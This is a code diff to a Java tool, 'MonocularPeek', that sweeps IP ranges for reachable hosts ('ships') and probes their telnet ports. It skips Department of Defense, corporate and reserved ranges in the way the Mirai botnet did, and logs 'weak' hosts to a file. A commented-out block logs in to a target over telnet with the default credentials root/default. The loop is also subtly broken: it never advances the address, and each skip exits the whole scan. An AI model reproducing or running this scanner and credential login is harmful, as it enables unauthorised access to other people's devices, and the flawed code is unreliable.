@@ -63,31 +63,68 @@ public class MonocularPeek {
         }
     }
 
-
-
     private void discoverShips(long startIp, long endIp) {
-        String host = longToIp(startIp);
-        System.out.println("Checking ship with " + host + " for weaknesses...");
+        while (startIp <= endIp) {
+            String host = longToIp(startIp);
+            System.out.println("Checking ship with " + host + " for weaknesses...");
+            String[] dodList = {"6.", "7.", "11.", "21.", "22.", "26.", "28.", "29.", "30.", "33.", "55.", "214.", "215."};
 
-        try {
-            if (InetAddress.getByName(host).isLoopbackAddress()) {
-                System.out.println("Loopback address, skipping...");
-                return;
+            try {
+                if (InetAddress.getByName(host).isLoopbackAddress()) {
+                    System.out.println("Loopback address, skipping...");
+                    return;
+                } else if (host.startsWith("0.")) {
+                    System.out.println("Invalid address space, skipping...");
+                    return;
+                } else if (host.startsWith("3.")) {
+                    System.out.println("General Electric Company, skipping...");
+                    return;
+                } else if (host.startsWith("15.") || host.startsWith("16.")) {
+                    System.out.println("Hewlett-Packard Company, skipping...");
+                    return;
+                } else if (host.startsWith("56.")) {
+                    System.out.println("US Postal Service, skipping...");
+                    return;
+                } else if (host.startsWith("10.") || host.startsWith("192.168.")) {
+                    System.out.println("internal networks, skipping...");
+                    return;
+                } else if ((host.startsWith("172.") && isInRange(host, "172.16.0.0", "172.31.255.255"))) {
+                    System.out.println("internal networks, skipping...");
+                    return;
+                } else if ((host.startsWith("100.") && isInRange(host, "100.64.0.0", "100.127.255.255"))) {
+                    System.out.println("IANA NAT, skipping...");
+                    return;
+                } else if ((host.startsWith("169.") && isInRange(host, "169.254.0.0", "169.254.255.255"))) {
+                    System.out.println("IANA NAT, skipping...");
+                    return;
+                } else if ((host.startsWith("198.") && isInRange(host, "198.18.0.0", "198.19.255.255"))) {
+                    System.out.println("IANA Special use, skipping...");
+                    return;
+                } else {
+                    for (String dodIp : dodList) {
+                        if (host.startsWith(dodIp)) {
+                            System.out.println("Department of Defense, skipping...");
+                            return;
+                        }
+                    }
+                }
+
+                if (isDeviceReachable(host, 80, 5000)) {
+                    System.out.println("Found ship: " + host);
+                    System.out.println("Checking if ship " + host + " is weak enough...");
+                    scanTelnetPorts(host, 10000);
+                    //}
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
             }
-            if (isDeviceReachable(host, 80, 5000)) {
-                System.out.println("Found ship: " + host);
-                System.out.println("Checking if ship " + host + " is weak enough...");
-                scanTelnetPorts(host, 5000);
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
         }
     }
 
     private void scanTelnetPorts(String host, int timeout) {
         try {
             if (!isPortOpen(host, timeout)) {
-                ActiveShips.remove(host);
+                //ActiveShips.remove(host);
                 System.out.println("Ship : " + host + " is too strong");
             } else {
                 System.out.println("-----------------------------------------");
@@ -146,6 +183,32 @@ public class MonocularPeek {
 
         return false;
     }
+    /* test method for scouter attacking a ship
+
+        String user = "root";
+        String pass = "default";
+
+        try (Socket socket = new Socket(server, port);
+             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
+             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
+
+            //send username
+            out.println(user);
+            out.flush();
+
+            // wait for password request, maybe we need pecific logics here?
+            // z.B. "Password: "
+            char[] buffer = new char[1024];
+            in.read(buffer);
+
+            // send pw
+            out.println(pass);
+            out.flush();
+
+            // do something with the answer -- atm: print it xd
+            in.read(buffer);
+            System.out.println(new String(buffer));
+     */
 
     private long ipToLong(InetAddress ip) {
         byte[] octets = ip.getAddress();
@@ -205,7 +268,6 @@ public class MonocularPeek {
         }
     }
 
-    // Methode zum Hinzufügen einer neuen IP-Adresse zur Datei
     private void addIPAddress(String ipAddress, String response) {
         try (BufferedWriter writer = new BufferedWriter(new FileWriter(LIST_OF_WEAK_SHIPS, true))) {
             writer.write(ipAddress + ", Response: " + response);
@@ -214,6 +276,18 @@ public class MonocularPeek {
         } catch (IOException e) {
             System.out.println("Fehler beim Hinzufügen zur Datei " + LIST_OF_WEAK_SHIPS + ": " + e.getMessage());
         }
+    }
+    //method that checks if ship is in a range of coordinates
+    private boolean isInRange(String ipAddress, String startRange, String endRange) throws UnknownHostException {
+        InetAddress start = InetAddress.getByName(startRange);
+        InetAddress end = InetAddress.getByName(endRange);
+        InetAddress ip = InetAddress.getByName(ipAddress);
+
+        long startLong = ipToLong(start);
+        long endLong = ipToLong(end);
+        long ipLong = ipToLong(ip);
+
+        return (ipLong >= startLong && ipLong <= endLong);
     }
 
 }
